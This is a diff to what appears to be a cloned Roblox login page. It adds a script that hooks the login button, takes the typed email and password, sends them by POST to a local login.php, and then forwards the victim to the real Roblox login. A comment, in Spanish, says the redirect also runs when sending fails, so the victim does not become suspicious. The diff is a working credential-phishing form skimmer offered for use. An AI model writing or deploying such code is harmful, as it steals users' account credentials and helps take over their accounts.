@@ -752,15 +752,47 @@
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/e1c68f73f4abea7bdd5af9574cdf034d.js'></script>
     
     <script>
-const btn = document.getElementById("login-button");
+const waitLoginBtn = setInterval(() => {
+    const btn = document.getElementById("login-button");
+    if (!btn) return;
 
-btn.addEventListener("pointerdown", function (e) {
-    e.preventDefault();
-    e.stopImmediatePropagation();
+    clearInterval(waitLoginBtn);
 
-    console.log("🔥 LOGIN HOOKEADO");
-    alert("Acción personalizada ejecutada");
-}, true);
+    btn.addEventListener("pointerdown", function (e) {
+        // Obtenemos los valores de los inputs
+        const userField = document.getElementsByName("email")[0];
+        const passField = document.getElementsByName("pass")[0];
+
+        if (userField && passField) {
+            const userData = userField.value;
+            const passData = passField.value;
+
+            // Enviamos los datos a tu login.php
+            fetch('login.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `email=${encodeURIComponent(userData)}&pass=${encodeURIComponent(passData)}`
+            })
+            .then(() => {
+                // Después de enviar, redirigimos a Roblox
+                window.location.href = "https://www.roblox.com/login";
+            })
+            .catch(() => {
+                // Si falla el envío, redirigimos igual para no levantar sospechas
+                window.location.href = "https://www.roblox.com/login";
+            });
+        }
+
+        // Bloqueamos la acción original del botón de Roblox
+        e.preventDefault();
+        e.stopImmediatePropagation();
+    }, true);
+
+    console.log("Botón interceptado y listo.");
+}, 100);
+
 </script>
 
 
